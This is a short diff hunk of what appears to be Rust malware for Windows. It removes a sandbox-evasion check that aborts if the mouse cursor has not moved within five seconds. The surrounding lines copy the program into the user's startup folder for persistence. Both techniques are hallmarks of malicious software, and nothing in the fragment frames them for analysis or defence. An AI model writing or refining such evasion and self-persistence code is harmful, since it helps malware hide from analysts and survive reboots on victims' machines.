@@ -28,18 +28,6 @@ async fn main() {
     // check mouse position, if not moved abort
     let mut cursor: POINT = POINT { x: 0i32, y: 0i32 };
 
-    unsafe {
-        GetCursorPos(&mut cursor);
-        let x = cursor.x;
-        let y = cursor.y;
-        thread::sleep(time::Duration::from_secs(5));
-        GetCursorPos(&mut cursor);
-
-        if x == cursor.x && y == cursor.y {
-            process::abort();
-        }
-    }
-
     // copy self to startup folder
     let mut path = fs::canonicalize(
         "C:\\Users\\".to_string()
